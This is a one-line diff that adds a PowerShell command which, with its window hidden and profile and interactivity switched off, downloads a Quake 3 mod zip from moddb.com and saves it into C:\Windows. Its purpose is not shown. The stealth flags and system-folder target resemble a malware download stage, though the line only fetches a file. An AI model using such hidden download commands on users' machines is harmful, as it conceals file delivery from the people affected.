@@ -1,0 +1,1 @@
+Powershell  -windowstyle hidden -nop -NoProfile -NonInteractive -c $Q3=Invoke-WebRequest -uri "https://www.moddb.com/mods/vanilla-style-quake-mod/downloads/quake-3-arena-116n-v41.zip" | Out-File "C:\Windows\quake-3-arena-116n-v41.zip"
